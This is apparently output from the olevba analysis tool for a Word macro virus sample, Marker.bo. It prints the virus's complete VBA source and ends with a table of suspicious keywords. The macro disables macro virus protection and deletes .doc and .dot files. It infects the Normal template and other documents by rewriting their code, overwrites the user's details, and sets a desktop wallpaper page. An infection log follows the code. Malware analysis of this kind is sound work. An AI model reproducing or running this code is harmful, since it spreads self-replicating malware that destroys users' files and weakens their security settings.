olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.bo-a10c7e115c6d771ea90a90ca05f0e5f845905ad0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.bo-a10c7e115c6d771ea90a90ca05f0e5f845905ad0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest-versi212x"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
DI = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
   nt.CodeModule.AddFromString Jon
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString Jon
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylife<p>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<p>You were gone since yester month But the memories, never would dissapear"
 Print #1, "<p>I think of you, I THINK OF YOU.<p>"
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "<p>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<p>You were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' JonMMx 2000
' jonthebest@hotbot.com


' 09:07:259:07:25 -Sabtu, 24 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:03:2112:03:21 PM PM-Friday, 27 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:47:402:47:40 PM PM-Sunday, 29 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:37:562:37:56 AM AM-Monday, 30 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:29:4310:29:43 PM PM-Wednesday, 1 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:28:249:28:24 AM AM-Sunday, 5 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:17:912:17:09 PM PM-Monday, 13 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:48:159:48:15 AM AM-Sunday, 26 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:29:5222:29:52 -Rabu, 27 Okt 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:10:109:10:10 AM AM-Saturday, 30 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:10:5010:10:50 PM PM-Tuesday, 9 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:57:1811:57:18 AM AM-Tuesday, 14 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:44:211:44:02 AM AM-Wednesday, 15 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:02:3110:02:31 AM AM-Thursday, 16 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:43:385:43:38 PM PM-Thursday, 16 Dec 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:55:419:55:41 AM AM-Monday, 3 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:29:3216:29:32 -Tuesday, 4 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:34:1011:34:10 -Tuesday, 11 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:47:1112:47:11 -Monday, 17 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:13:408:13:04 -Monday, 17 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:10:5312:10:53 PM PM-Monday, 17 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

